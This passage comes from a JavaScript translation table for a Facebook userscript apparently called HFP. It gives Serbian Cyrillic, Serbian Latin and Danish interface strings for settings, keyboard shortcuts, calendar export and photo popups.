		'ConfHomeStretch' : 'Рашири почетну страницу на пуну ширину прозора претраживача.',
 		'ConfHomeStretchComments' : 'Рашири коментаре на почетној страници.',
		'ConfiCalendar' : 'Додај везе за преузимање <a href="http://en.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a> датотеке са свим рођенданима.',
		'ConfImport' : 'Да бисе касније увезли своја подешавања, замените текст који следи са текстом који сте претходно сачували и кликните "Увоз".',
		'ConfInboxCountInTitle' : 'Прикажи број нових порука у наслову странице.',
		'ConfLogoutLink' : 'Додај везу за одјављивање на горњу траку са менијима.',
		'ConfNotificationCountInTitle' : 'Прикажи број нових обавештења у наслову странице.',
		'ConfNewTabSearch' : 'Када притиснем CTRL + Enter за претрагу, отвори резултате претраге у новој картици/прозору.',
		'ConfPageTitle' : 'Уклони "Facebook |" из наслова свих страница.',
		'ConfPhotoPopup' : 'Прикажи веће верзије фотографија приликом преласка мишем.',
		'ConfPopupAutoClose' : 'Аутоматски затвори увећане слике.',
		'ConfPopupSmartAutoClose' : 'Не затварај увећане слике ако је показивач миша на њима.',
		'ConfPopupPosition' : 'Положај увећаних слика',
		'ConfProcessInterval' : 'Интервал за обраду странице, у милисекундама (подразумевано=1000):',
		'ConfProfileLink' : 'Прикажи везу за Профил на горњу траку са менијима.',
		'ConfProfilePicPopup' : 'Прикажи веће верзије слика на профилу приликом преласка мишем',
		'ConfProtocolLinks' : 'Претвори надимке програма за комуникацију (Google Talk, Windows Live и др.) са профила у везе којима ће се започети ћаскање.',
		'ConfSectionAbout' : 'О додатку HFP',
		'ConfSectionAdvanced' : 'Више опција',
		'ConfSectionEvents' : 'Рођендани/догађаји',
		'ConfSectionImportExport' : 'Увоз/Извоз',
		'ConfSectionFeeds' : 'Новости',
		'ConfSectionHomePage' : 'Почетна страница',
		'ConfSectionLiveFeed' : 'Најновије',
		'ConfSectionMenu' : 'Менији/ћаскање',
		'ConfSectionOther' : 'Остале опције',
		'ConfSectionPageTitle' : 'Наслов странице',
		'ConfSectionPictures' : 'Слике',
		'ConfSectionShortcuts' : 'Пречице са тастатуре',
		'ConfSecureLinks' : 'Присили усмеравање Фејсбук веза на HTTPS странице.',
		'ConfShortcutList' : '<b>Пречице са тастатуре</b> (разликују се мала и велика слова):<br /><br /><i>Са било које странице:</i><br /> <b>A</b> - Албуми/фотографије<br /> <b>B</b> - Списак доступних пријатеља<br /> <b>C</b> - HFP подешавања<br /> <b>D</b> - Рођендани<br /> <b>E</b> - Догађаји<br /> <b>F</b> - Пријатељи<br /> <b>H</b> - Почетна страница<br /> <b>I</b> - Примљене поруке<br /> <b>K</b> - додај забелешку<br /> <b>L</b> - Означи везу за одјаву (притисните Ентер након тога за одјављивање)<br /> <b>N</b> - Обавештења<br /> <b>P</b> - Профил<br /> <b>R</b> - Захтеви<br /> <b>S</b> - Прелазак на поље за претрагу<br /> <b>T</b> - Преведи одабрани текст<br /> <b>?</b> - Прикажи извештај о грешци HFP-а<br /> <b><escape></b> - Затвори искачуће прозоре које је направио HFP<br /><br /><i>Са почетне странице (филтери)</i>:<br /> <b>a</b> - Странице<br /> <b>f</b> - Најновије<br /> <b>g</b> - Групе<br /> <b>l</b> - Везе<br /> <b>n</b> - Новости<br /> <b>p</b> - Фотографије<br /> <b>s</b> или <b>u</b> - Промене статуса<br /> <b>t</b> - Белешке<br /> <b>v</b> - Видео<br /><br /><i>Са профила</i>:<br /> <b>i</b> - Информације<br /> <b>p</b> - Фотографије<br /> <b>w</b> - Зид<br /> <b>x</b> - Оквири<br /><br /><i>Са страница са набрајањем (претходна, следћа, итд.)</i><br /> <b><стрелица лево></b> - Претходна<br /> <b><стрелица десно></b> - Следећа<br /> <b><шифт> + <стрелица лево></b> - Прва (ако је доступно)<br /> <b><шифт> + <стрелица десно></b> - Последња (ако је доступно)<br /><br /><i>Приликом прегледавања албума/фотографија:</i><br /> <b>a</b> - Учитај све сличице (ако је доступно)<br /> <b>b</b> - Прикажи велике слике<br /> <b>c</b> - Прикажи коментаре<br /> <b>k</b> - Назад на албум<br /> <b>m</b> - Фотографије са (корисником) и са мном<br /><br /><i>При прегледавању скорашњих албума и постављених/означених фотографија:</i><br /> <b>a</b> или  <b>r</b> - Скорашњи албуми<br /> <b>m</b> или  <b>u</b> - Постављено преко мобилног телефона<br /> <b>o</b> - Фотографије на којима сам ја<br /> <b>p</b> - Моје фотографије<br /> <b>t</b> или  <b>f</b> - Означени пријатељи',
		'ConfShortcuts' : 'Омогући пречице са тастатуре.',
		'ConfSign' : 'Прикажи корисников хороскопски знак на његовом профилу (уколико је наведен пун датум рођења).',
		'ConfTopBarFixed' : 'Задржи горњу траку са менијима на екрану и приликом померања странице на доле.',
		'ConfTopBarHoverOpacity' : 'Приликом преласка мишем',
		'ConfTopBarOpacity' : 'Провидност Горње траке са менијима',
		'DownloadVideo' : 'Преузми видео',
		'ExportICalendarFile' : 'Извези iCalendar датотеку',
		'ExportICalendarFileWarning' : '(Ово може да потраје ако имате много пријатеља)',
		'FacebookFixerConflict' : 'HFP се сада зове HFP. Због промене имена мораћете ручно да уклоните HFP из свог прегледача да не би дошло до ометања између ове две скрипте. Ако нисте сигурни како да уклоните скрипту, <a %s>кликните овде за упутство</a>.',
		'fullAlbumLoaded' : 'цео албум је учитан',
		'Import' : 'Увоз',
		'ImportConfirm' : 'Да ли сте сигурни да желите да увезете ова подешавања?\nВаша тренутна подешавања ће бити поништена.',
		'ImportFailure' : 'Дошло је до грешке приликом увоза ваших подешавања.',
		'ImportSuccess' : 'Увоз је завршен. Да ли желите да освежите страницу?',
		'Left' : 'Лево',
		'LoadingAllPhotos' : 'Учитавање свих фотографија...',
		'loadingFullAlbum' : 'учитавање свих албума...',
		'LoadingPic' : 'Учитавање слике...',
		'LoadPhotosWarning' : 'Учитавање свих фотографија може да потраје неко време',
		'Months' : new Array('Јануар','Фебруар','Март','Април','Мај','Јун','Јул','Август','Септембар','Октобар','Новембар','Децембар'),
		'ProtocolSkype' : 'Позови корисника %s путем програма Skype',
		'ProtocolMSN' : 'Ћаскај са корисником %s путем програма Windows Live',
		'ProtocolYahoo' : 'Ћаскај са корисником %s путем програма Yahoo Messenger',
		'ProtocolGoogle' : 'Ћаскај са корисником %s путем програма Google Talk',
		'ReloadErrorPage' : 'Кликните да покушате поново, или сачекајте 5 секунди',
		'Refresh' : 'Освежи',
		'Remove' : 'Уклони',
		'Right' : 'Десно',
		'ShowBigPictures' : 'Прикажи велике слике',
		'Signs' : new Array('Јарац','Водолија','Рибе','Ован','Бик','Близанци','Рак','Лав','Девица','Вага','Шкорпија','Стрелац'),
		'today' : 'данас',
		'Translators' : 'Преводиоци',
		'UpdateAvailable1' : 'Доступне су надоградње за HFP',
		'UpdateAvailable2' : 'Желите ли сада да надоградите?',
		'UpdateHomepage' : 'Иди на почетну страницу',
		'UpdateInstall' : 'Инсталирај одмах',
		'UpdateTomorrow' : 'Подсети ме сутра',
 		'ViewAlbumComments' : 'Прикажи коментаре албума',
		'yearsOld' : '%s година'
	},

	// Serbian (Latin) - Contributed by Gorštak (20100817)
	sr : {
		'_language' : 'Serbian (Latin)',
		'AddToCalendar' : 'Dodaj u kalendar',
		'AddToGoogleCalendar' : 'Dodaj u Google kalendar',
		'all' : 'sve',
		'All' : 'Sve',
		'AllPhotosLoaded' : 'Sve fotografije su učitane',
		'Automatic' : 'Automatski',
		'Birthday' : 'Rođendan korisnika %s',
		'BookmarkAdd' : 'Dodaj novu zabelešku',
		'BookmarkExists' : 'Ova stranica je već dodata u zabeleške.\n\nIdite na stranicu koju želite da dodate i pokušajte ponovo.',
		'BookmarkNamePrompt' : 'Unesite naziv ove zabeleške:\n%s',
 		'BookmarksConfirmRemoval' : 'Da li ste sigurni da želite da uklonite ove zabeleške?',
 		'BookmarksManage' : 'Uredi zabeleške',
 		'BookmarksRemoveSelected' : 'Ukloni izabrane zabeleške',
		'Bookmarks' : 'Zabeleške',
		'BrowserUnsupported' : 'Vaš pretraživač ne podržava ovu opciju.',
		'CreatingFile' : 'Datoteka se izrađuje',
		'Close' : 'Zatvori',
		'ConfigureFacebookFixer' : 'Podesi HFP',
		'ConfigureInstructions' : 'Sve izmene se se odmah pamte, ali ponekad je potrebno osvežiti otvorene stranice da bi izmene delovale.',
		'ConfAge' : 'Prikaži uzrast osobe na profilu (ukoliko je naveden pun datum pođenja).',
 		'ConfAlbumComments' : 'Dodaj vezu na stranici albuma kojom bi se prikazali svi komentari albuma.',
		'ConfApplicationWhitelist' : 'Spisak dozvoljenih aplikacija - Unesite oznaku aplikacije kako biste sprečili njeno sakrivanje. Razdvojte oznake razmakom.',
		'ConfAutoBigAlbumPictures' : 'Automatski prikaži veće fotografije iz albuma kada se stranica otvori.',
		'ConfAutoLoadFullAlbum' : 'Automatski, na jednoj stranici, učitaj sličice svih fotografija iz albuma.',
		'ConfAutoLoadTaggedPhotos' : 'Automatski, na jednoj stranici, učitaj sličice svih označenih fotografija (na kartici "Fotografije" unutar profila).',
		'ConfAutoReadMore' : 'Automatski klikni na vezu "starije".',
		'ConfBigAlbumPictures' : 'Na stranici albuma dodaj vezu za prikazivanje većih sličica svih fotografija sa te stranice.',
		'ConfBookmarks' : 'Dodaj podmeni "Zabeleške" na gornju traku sa menijima.',
		'ConfBottomBarHoverOpacity' : 'Prilikom prelaska mišem',
		'ConfBottomBarOpacity' : 'Providnost donje trake sa menijima',
		'ConfCalendarBirthDate' : 'Uključi datum rođenja korisnika u detaljima događaja.',
		'ConfCalendarFullName' : 'Dodaj i prezime korisnika u naslovu rođendana.',
		'ConfChatDifferentiate' : 'Označi dostupne prijatelje podebljanim slovima a neaktivne kosim slovima.',
		'ConfChatHideIdle' : 'Sakrij neaktivne prijatelje.',
		'ConfDelayPopupPics' : 'Uključi kratak zastoj pre prikazivanja uvećanih slika.',
		'ConfDelayPopupPicsTimeout' : 'Zastoj pre prikazivanja uvećanih slika, u milisekundama (podrazumevano=500):',
		'ConfDownloadVideo' : 'Dodaj vezu za preuzimanje video snimka sa stranice za video. (Možda će vam trebati <a href="http://en.wikipedia.org/wiki/Flash_Video#FLV_players" target="_blank">FLV player</a>)',
		'ConfErrorPageReload' : 'Automatsko ponovno učitavanje stranice nakon 5 sekundi, u slučaju greške.',
		'ConfExport' : 'Da biste izvezli svoja podešavanja, kopirajte tekst koji sledi i sačuvajte ga u datoteku.',
		'ConfExternalPopup' : 'Prikaži uvećane slike fotografija sa spoljašnjih stranica. <sup>beta</sup>',
		'ConfFacebookHFPLanguage' : 'Jezik HFP-a',
		'ConfFacebookTimestamps' : 'Prikaži Fejsbuk vreme (npr. "pre 3 sata").',
		'ConfFBFTimestamps' : 'Dodaj HFP vreme posle Fejsbuk vremena (npr. "11:45").',
		'ConfFBFTimestamps24' : 'Prikaži HFP vremena u 24-časovnom obliku.',
		'ConfFriendRequestCountInTitle' : 'Prikaži broj zahteva za prijateljstvo u naslovu stranice.',
		'ConfGoogleApps' : 'Napravi veze za Google kalendar, pogodne za Google ove aplikacije.',
		'ConfGoogleAppsDomain' : 'Domen',
		'ConfGoogleCalendar' : 'Dodaj veze za dodavanje rođendana i događaja u <a href="http://en.wikipedia.org/wiki/Google_Calendar" target="_blank">Google kalendar</a>.',
		'ConfGoogleLanguage' : 'Jezik za <a href="http://en.wikipedia.org/wiki/Google_Translate" target="_blank">Google prevodilac</a>',
		'ConfHideApplicationStories' : 'Sakrij obaveštenja o aplikacijama.',
		'ConfHideEventStories' : 'Sakrij obaveštenja o događajima.',
 		'ConfHideFacebookCountInTitle' : 'Sakrij Fejsbukov broj novih primljenih poruka.',
		'ConfHideFriendStories' : 'Sakrij obaveštenja o prijateljstvima.',
		'ConfHideGroupStories' : 'Sakrij obaveštenja o grupama.',
 		'ConfHideLikeStories' : 'Sakrij obaveštenja o "dopada mi se" stavkama.',
		'ConfHideLinkStories' : 'Sakrij obaveštenja o vezama.',
		'ConfHideNoteStories' : 'Sakrij obaveštenja o zapisima.',
		'ConfHidePhotoStories' : 'Sakrij obaveštenja o fotografijama.',
		'ConfHideProfilePicStories' : 'Sakrij obaveštenja o slikama na profilu.',
		'ConfHideRead' : 'U najnovijim dešavanjima sakrij stavke koje su označene kao pročitane.',
		'ConfHideRelationshipStories' : 'Sakrij obaveštenja o statusima veze.',
		'ConfHideStatusStories' : 'Sakrij promene statusa.',
		'ConfHideVideoStories' : 'Sakrij obaveštenja o video zapisima.',
		'ConfHideWallStories' : 'Sakrij obaveštenja sa zida.',
 		'ConfHomeBeta' : 'Prikaži odeljak sa Fejsbukovim najavama.',
		'ConfHomeChat' : 'Prikaži odeljak sa ćaskanjem.',
		'ConfHomeEvents' : 'Prikaži odeljak sa događajima.',
		'ConfHomeFindFriends' : 'Prikaži "Poveži se sa" odeljak.',
		'ConfHomeLeftAlign' : 'Poravnaj sadržaj početne stranice po levoj strani.',
		'ConfHomeLeftColumn' : 'Prikaži levu kolonu.',
		'ConfHomeLeftColumnFixed' : 'Neka leva kolona bude vidljiva i prilikom pomeranja stranice na dole.',
		'ConfHomeLink' : 'Prikaži vezu za Početnu stranicu na gornjoj traci sa menijima.',
		'ConfHomeNavigation' : 'Prikaži odeljak za navigaciju.',
		'ConfHomePokes' : 'Prikaži "Bockanje" odeljak.',
		'ConfHomeProfile' : 'Prikaži "Profil" odeljk.',
 		'ConfHomeRecommendations' : 'Prikaži preporuke (Osobe koje možda poznaješ, Preporučene stranice itd.).',
		'ConfHomeRequests' : 'Prikaži "Zahtevi" odeljak.',
		'ConfHomeRightColumn' : 'Prikaži desnu kolonu.',
		'ConfHomeStretch' : 'Raširi početnu stranicu na punu širinu prozora pretraživača.',
 		'ConfHomeStretchComments' : 'Raširi komentare na početnoj stranici.',
		'ConfiCalendar' : 'Dodaj veze za preuzimanje <a href="http://en.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a> datoteke sa svim rođendanima.',
		'ConfImport' : 'Da bise kasnije uvezli svoja podešavanja, zamenite tekst koji sledi sa tekstom koji ste prethodno sačuvali i kliknite "Uvoz".',
		'ConfInboxCountInTitle' : 'Prikaži broj novih poruka u naslovu stranice.',
		'ConfLogoutLink' : 'Dodaj vezu za odjavljivanje na gornju traku sa menijima.',
		'ConfNotificationCountInTitle' : 'Prikaži broj novih obaveštenja u naslovu stranice.',
		'ConfNewTabSearch' : 'Kada pritisnem CTRL + Enter za pretragu, otvori rezultate pretrage u novoj kartici/prozoru.',
		'ConfPageTitle' : 'Ukloni "Facebook |" iz naslova svih stranica.',
		'ConfPhotoPopup' : 'Prikaži veće verzije fotografija prilikom prelaska mišem.',
		'ConfPopupAutoClose' : 'Automatski zatvori uvećane slike.',
		'ConfPopupSmartAutoClose' : 'Ne zatvaraj uvećane slike ako je pokazivač miša na njima.',
		'ConfPopupPosition' : 'Položaj uvećanih slika',
		'ConfProcessInterval' : 'Interval za obradu stranice, u milisekundama (podrazumevano=1000):',
		'ConfProfileLink' : 'Prikaži vezu za Profil na gornju traku sa menijima.',
		'ConfProfilePicPopup' : 'Prikaži veće verzije slika na profilu prilikom prelaska mišem',
		'ConfProtocolLinks' : 'Pretvori nadimke programa za komunikaciju (Google Talk, Windows Live i dr.) sa profila u veze kojima će se započeti ćaskanje.',
		'ConfSectionAbout' : 'O dodatku HFP',
		'ConfSectionAdvanced' : 'Više opcija',
		'ConfSectionEvents' : 'Rođendani/događaji',
		'ConfSectionImportExport' : 'Uvoz/Izvoz',
		'ConfSectionFeeds' : 'Novosti',
		'ConfSectionHomePage' : 'Početna stranica',
		'ConfSectionLiveFeed' : 'Najnovije',
		'ConfSectionMenu' : 'Meniji/ćaskanje',
		'ConfSectionOther' : 'Ostale opcije',
		'ConfSectionPageTitle' : 'Naslov stranice',
		'ConfSectionPictures' : 'Slike',
		'ConfSectionShortcuts' : 'Prečice sa tastature',
		'ConfSecureLinks' : 'Prisili usmeravanje Fejsbuk veza na HTTPS stranice.',
		'ConfShortcutList' : '<b>Prečice sa tastature</b> (razlikuju se mala i velika slova):<br /><br /><i>Sa bilo koje stranice:</i><br /> <b>A</b> - Albumi/fotografije<br /> <b>B</b> - Spisak dostupnih prijatelja<br /> <b>C</b> - HFP podešavanja<br /> <b>D</b> - Rođendani<br /> <b>E</b> - Događaji<br /> <b>F</b> - Prijatelji<br /> <b>H</b> - Početna stranica<br /> <b>I</b> - Primljene poruke<br /> <b>K</b> - dodaj zabelešku<br /> <b>L</b> - Označi vezu za odjavu (pritisnite Enter nakon toga za odjavljivanje)<br /> <b>N</b> - Obaveštenja<br /> <b>P</b> - Profil<br /> <b>R</b> - Zahtevi<br /> <b>S</b> - Prelazak na polje za pretragu<br /> <b>T</b> - Prevedi odabrani tekst<br /> <b>?</b> - Prikaži izveštaj o grešci HFP-a<br /> <b><escape></b> - Zatvori iskačuće prozore koje je napravio HFP<br /><br /><i>Sa početne stranice (filteri)</i>:<br /> <b>a</b> - Stranice<br /> <b>f</b> - Najnovije<br /> <b>g</b> - Grupe<br /> <b>l</b> - Veze<br /> <b>n</b> - Novosti<br /> <b>p</b> - Fotografije<br /> <b>s</b> ili <b>u</b> - Promene statusa<br /> <b>t</b> - Beleške<br /> <b>v</b> - Video<br /><br /><i>Sa profila</i>:<br /> <b>i</b> - Informacije<br /> <b>p</b> - Fotografije<br /> <b>w</b> - Zid<br /> <b>x</b> - Okviri<br /><br /><i>Sa stranica sa nabrajanjem (prethodna, sledća, itd.)</i><br /> <b><strelica levo></b> - Prethodna<br /> <b><strelica desno></b> - Sledeća<br /> <b><šift> + <strelica levo></b> - Prva (ako je dostupno)<br /> <b><šift> + <strelica desno></b> - Poslednja (ako je dostupno)<br /><br /><i>Prilikom pregledavanja albuma/fotografija:</i><br /> <b>a</b> - Učitaj sve sličice (ako je dostupno)<br /> <b>b</b> - Prikaži velike slike<br /> <b>c</b> - Prikaži komentare<br /> <b>k</b> - Nazad na album<br /> <b>m</b> - Fotografije sa (korisnikom) i sa mnom<br /><br /><i>Pri pregledavanju skorašnjih albuma i postavljenih/označenih fotografija:</i><br /> <b>a</b> ili  <b>r</b> - Skorašnji albumi<br /> <b>m</b> ili  <b>u</b> - Postavljeno preko mobilnog telefona<br /> <b>o</b> - Fotografije na kojima sam ja<br /> <b>p</b> - Moje fotografije<br /> <b>t</b> ili  <b>f</b> - Označeni prijatelji',
		'ConfShortcuts' : 'Omogući prečice sa tastature.',
		'ConfSign' : 'Prikaži korisnikov horoskopski znak na njegovom profilu (ukoliko je naveden pun datum rođenja).',
		'ConfTopBarFixed' : 'Zadrži gornju traku sa menijima na ekranu i prilikom pomeranja stranice na dole.',
		'ConfTopBarHoverOpacity' : 'Prilikom prelaska mišem',
		'ConfTopBarOpacity' : 'Providnost Gornje trake sa menijima',
		'DownloadVideo' : 'Preuzmi video',
		'ExportICalendarFile' : 'Izvezi iCalendar datoteku',
		'ExportICalendarFileWarning' : '(Ovo može da potraje ako imate mnogo prijatelja)',
		'FacebookFixerConflict' : 'HFP se sada zove HFP. Zbog promene imena moraćete ručno da uklonite HFP iz svog pregledača da ne bi došlo do ometanja između ove dve skripte. Ako niste sigurni kako da uklonite skriptu, <a %s>kliknite ovde za uputstvo</a>.',
		'fullAlbumLoaded' : 'ceo album je učitan',
		'Import' : 'Uvoz',
		'ImportConfirm' : 'Da li ste sigurni da želite da uvezete ova podešavanja?\nVaša trenutna podešavanja će biti poništena.',
		'ImportFailure' : 'Došlo je do greške prilikom uvoza vaših podešavanja.',
		'ImportSuccess' : 'Uvoz je završen. Da li želite da osvežite stranicu?',
		'Left' : 'Levo',
		'LoadingAllPhotos' : 'Učitavanje svih fotografija...',
		'loadingFullAlbum' : 'učitavanje svih albuma...',
		'LoadingPic' : 'Učitavanje slike...',
		'LoadPhotosWarning' : 'Učitavanje svih fotografija može da potraje neko vreme',
		'Months' : new Array('Januar','Februar','Mart','April','Maj','Jun','Jul','Avgust','Septembar','Oktobar','Novembar','Decembar'),
		'ProtocolSkype' : 'Pozovi korisnika %s putem programa Skype',
		'ProtocolMSN' : 'Ćaskaj sa korisnikom %s putem programa Windows Live',
		'ProtocolYahoo' : 'Ćaskaj sa korisnikom %s putem programa Yahoo Messenger',
		'ProtocolGoogle' : 'Ćaskaj sa korisnikom %s putem programa Google Talk',
		'ReloadErrorPage' : 'Kliknite da pokušate ponovo, ili sačekajte 5 sekundi',
		'Refresh' : 'Osveži',
		'Remove' : 'Ukloni',
		'Right' : 'Desno',
		'ShowBigPictures' : 'Prikaži velike slike',
		'Signs' : new Array('Jarac','Vodolija','Ribe','Ovan','Bik','Blizanci','Rak','Lav','Devica','Vaga','Škorpija','Strelac'),
		'today' : 'danas',
		'Translators' : 'Prevodioci',
		'UpdateAvailable1' : 'Dostupne su nadogradnje za HFP',
		'UpdateAvailable2' : 'Želite li sada da nadogradite?',
		'UpdateHomepage' : 'Idi na početnu stranicu',
		'UpdateInstall' : 'Instaliraj odmah',
		'UpdateTomorrow' : 'Podseti me sutra',
 		'ViewAlbumComments' : 'Prikaži komentare albuma',
		'yearsOld' : '%s godina'
	},

	// Danish - Contributed by Mads Jensen (20100210)
	da : {
		'_language' : 'Danish',
		'AddToCalendar' : 'Tilføj til kalender',
		'AddToGoogleCalendar' : 'Tilføj til Google Calendar',
		'all' : 'alle',
		'All' : 'Alle',
		'AllPhotosLoaded' : 'Alle billeder er hentet',
		'Automatic' : 'Automatisk',
		'Birthday' : '%s\'s fødselsdag',
		'BookmarkAdd' : 'Tilføj nyt bogmærke',
		'BookmarkConfirmRemoval' : 'Er du sikker på du vil fjerne bogmærket "%s"?',
		'BookmarkDoesNotExist' : 'Denne side har intet bogmærke.\n\nGå til siden du vil fjerne og prøv igen.',
		'BookmarkExists' : 'Der er allerede et bogmærke til denne side.\n\nGå til siden du vil tilføje et bogmærke for og prøv igen.',
		'BookmarkNamePrompt' : 'Skriv et navn til dette bogmærke:\n%s',
		'BookmarkRemove' : 'Fjern bogmærke',
		'CreatingFile' : 'Opret fil',
		'Close' : 'Luk',
		'ConfigureFacebookFixer' : 'Konfigurér HFP',
		'ConfigureInstructions' : 'Alle ændringer bliver gemt med det samme, men nogle ændringer vil ikke vises i allerede åbne faneblade.',
		'ConfAge' : 'Vis folks alder på deres profil (hvis de har oplyst fødselsdato).',
		'ConfAutoBigAlbumPictures' : 'Vis automatisk større album billeder, når siden åbnes.',
		'ConfAutoLoadFullAlbum' : 'Hent automatisk miniaturer til alle billeder i et album, på en enkelt side.',
		'ConfAutoLoadTaggedPhotos' : 'Hent automatisk miniaturer til alle taggede billeder i et album, på en enkelt side (Billeder fanebladet på folks profil).',
		'ConfAutoReadMore' : 'Tryk automatisk på  "Vis mere" links.',
		'ConfBigAlbumPictures' : 'Tilføj et link på album sider, til at vise større udgaver af alle billeder på den side.',
		'ConfBookmarks' : 'Tilføj "Bogmærker" til topmenuen.',
		'ConfBottomBarHoverOpacity' : 'Når musen er over',
		'ConfBottomBarOpacity' : 'Gennemsigtighed af menuen nederst på siden',
		'ConfCalendarBirthDate' : 'Inkludér personens fødselsdag i begivenhedens detaljer.',
		'ConfCalendarFullName' : 'Brug personens fulde navn som titlen til fødselsdage (i stedet for kun fornavn).',
		'ConfChatDifferentiate' : 'Brug fed og kursiv for at skelne mellem tilgængelige og optagede venner.',
		'ConfChatHideIdle' : 'Skjul optagede venner.',
		'ConfDelayPopupPics' : 'Tilføj en kort pause før billeder popper op.',
		'ConfDelayPopupPicsTimeout' : 'Pause før billeder popper op, i millisekunder (standard er 500)',
		'ConfDownloadVideo' : 'Tilføj et link til at hente videoer fra "Video" sider. (Du får sikkert brug for en <a href="http://en.wikipedia.org/wiki/Flash_Video#FLV_players" target="_blank">FLV afspiller</a>)',
		'ConfErrorPageReload' : 'Genindlæs applikationsfejl sider efter 5 sekunder.',
		'ConfExternalPopup' : 'Vis eksterne billeder i fuld størrelse. <sup>beta</sup>',
		'ConfFacebookHFPLanguage' : 'Sprog i HFP',
		'ConfFacebookTimestamps' : 'Vis Facebook tidsstempler (f.eks. "3 timer sider").',
		'ConfFBFTimestamps' : 'Tilføj HFP tidsstempler efter Facebook tidsstempler (f.eks. "11:45").',
		'ConfFBFTimestamps24' : 'Vis HFP tidsstempler i 24 timers format.',
		'ConfFriendRequestCountInTitle' : 'Vis antallet af anmodninger om venskab i siden titel.',
		'ConfGoogleApps' : 'Lav Google Calendar links kompatible med Google Apps.',
		'ConfGoogleAppsDomain' : 'Domæne',
		'ConfGoogleCalendar' : 'Tilføj links til at tilføje fødselsdage og begivenheder til <a href="http://en.wikipedia.org/wiki/Google_Calendar" target="_blank">Google Calendar</a>.',
		'ConfGoogleLanguage' : 'Sprog i <a href="http://en.wikipedia.org/wiki/Google_Translate" target="_blank">Google Translate</a>',
		'ConfHideApplicationStories' : 'Skjul applikations beskeder.',
		'ConfHideEventStories' : 'Skjul begivenhed beskeder.',
		'ConfHideFanStories' : 'Skjul fan beskeder.',
		'ConfHideFriendStories' : 'Skjul ven beskeder.',
		'ConfHideGroupStories' : 'Skjul gruppe beskeder.',
		'ConfHideLinkStories' : 'Skjul link beskeder.',
		'ConfHidePhotoStories' : 'Skjul billede beskeder.',
		'ConfHideProfilePicStories' : 'Skjul profilbillede beskeder.',
		'ConfHideRead' : 'Skjul beskeder der er markeret som læst.',
		'ConfHideRelationshipStories' : 'Skjul parforholds beskeder.',
		'ConfHideStatusStories' : 'Skjul status beskeder.',
		'ConfHideVideoStories' : 'Skjul video beskeder.',
		'ConfHideWallStories' : 'Skjul væg beskeder.',
		'ConfHomeChat' : 'Vis Chat sektionen.',
		'ConfHomeEvents' : 'Vis Begivenheder sektionen.',
		'ConfHomeFindFriends' : 'Vis Skab forbindelser til venner sektionen.',
		'ConfHomeLeftAlign' : 'Venstrestil indholdet på forsiden.',
		'ConfHomeLeftColumn' : 'Vis venstre kolonne.',
		'ConfHomeLeftColumnFixed' : 'Hold venstre kolonne synlig, selv efter der er scrollet ned på siden.',
		'ConfHomePeopleYouMayKnow' : 'Vis Forslag sektionen.',
		'ConfHomeNavigation' : 'Vis Navigation sektionen.',
		'ConfHomePokes' : 'Vis Prik sektionen.',
		'ConfHomeProfile' : 'Vis Profil sektionen.',
		'ConfHomeRequests' : 'Vis Anmodninger sektionen.',
		'ConfHomeRightColumn' : 'Vis højre kolonne.',
		'ConfHomeStretch' : 'Stræk forsiden til browser vinduets fulde bredde.',
		'ConfiCalendar' : 'Tilføj links til at hente en <a href="http://en.wikipedia.org/wiki/ICalendar" target="_blank">iCalendar</a> fil med alle fødselsdage.',
		'ConfInboxCountInTitle' : 'Vis antallet af nye beskeder i indbakken, i sidens titel.',
		'ConfLogoutLink' : 'Tilføj et "Log ud" link til top menuen.',
		'ConfNotificationCountInTitle' : 'Vis antallet af nye notifikationer i sidens titel.',
		'ConfNewTabSearch' : 'Tving søgeresultater til at åbne i et nyt vindue, når der trykkes CTRL + Enter ved søgning.',
		'ConfPageTitle' : 'Fjern "Facebook |" fra titlen på alle sider.',
		'ConfPhotoPopup' : 'Popop større udgaver af billeder når musen holdes over.',
		'ConfPopupAutoClose' : 'Luk popop billeder automatisk.',
		'ConfPopupSmartAutoClose' : 'Stop popop billeder fra at lukke automatisk hvis musen er over.',
		'ConfPopupPosition' : 'Position for popop billeder',
		'ConfProcessInterval' : 'Interval mellem håndtering af siden, i millisekunder (standard er 1000)',
		'ConfProfilePicPopup' : 'Popop større udgaver af profilbilleder når musen holdes over',
		'ConfProtocolLinks' : 'Lav IMs på profiler til links der starter en samtale (Google Talk, Windows Live o.s.v.).',
		'ConfSectionAbout' : 'Omkring HFP',
		'ConfSectionAdvanced' : 'Avanceret',
		'ConfSectionEvents' : 'Fødselsdage/Begivenheder',
		'ConfSectionFeeds' : 'Beskeder',
		'ConfSectionHomePage' : 'Forside',
		'ConfSectionLiveFeed' : 'Live Feed',
		'ConfSectionMenu' : 'Menu/Chat',
		'ConfSectionOther' : 'Andre indstillinger',
		'ConfSectionPageTitle' : 'Side titel',
		'ConfSectionPictures' : 'Billeder',
		'ConfSectionShortcuts' : 'Tastatur genveje',
		'ConfSecureLinks' : 'Tving Facebook links til at bruge HTTPS.',
		'ConfShortcutList' : '<b>Tastatur genveje</b> (forskel på store og små bogstaver):<br /><br /><i>Fra enhver side:</i><br />&nbsp;<b>A</b> - Album/billeder<br />&nbsp;<b>B</b> - Skift venne liste (online venner)<br />&nbsp;<b>C</b> - HFP konfiguration<br />&nbsp;<b>D</b> - Fødselsdage<br />&nbsp;<b>E</b> - Begivenheder<br />&nbsp;<b>F</b> - Venner<br />&nbsp;<b>H</b> - Forside<br />&nbsp;<b>I</b> - Indbakke<br />&nbsp;<b>K</b> - Tilføj bogmærke<br />&nbsp;<b>L</b> - Vælg Log ud linket (tryk Enter efterfølgende for at logge ud)<br />&nbsp;<b>N</b> - Notifikationer<br />&nbsp;<b>P</b> - Din profil<br />&nbsp;<b>R</b> - Anmodninger<br />&nbsp;<b>S</b> - Hop til søgefeltet<br />&nbsp;<b>T</b> - Oversæt valgte tekst<br />&nbsp;<b>?</b> - Vis HFP debug info<br />&nbsp;<b>&lt;escape&gt;</b> - Luk popops fra HFP<br /><br /><i>Fra forsiden (filtre)</i>:<br />&nbsp;<b>a</b> - Sider<br />&nbsp;<b>f</b> - Live feed<br />&nbsp;<b>g</b> - Grupper<br />&nbsp;<b>l</b> - Links<br />&nbsp;<b>n</b> - Nyheder<br />&nbsp;<b>p</b> - Billeder<br />&nbsp;<b>s</b> eller <b>u</b> - Status opdateringer<br />&nbsp;<b>t</b> - Noter<br />&nbsp;<b>v</b> - Videoer<br /><br /><i>Fra profiler</i>:<br />&nbsp;<b>i</b> - Info<br />&nbsp;<b>p</b> - Billeder<br />&nbsp;<b>w</b> - Væg<br 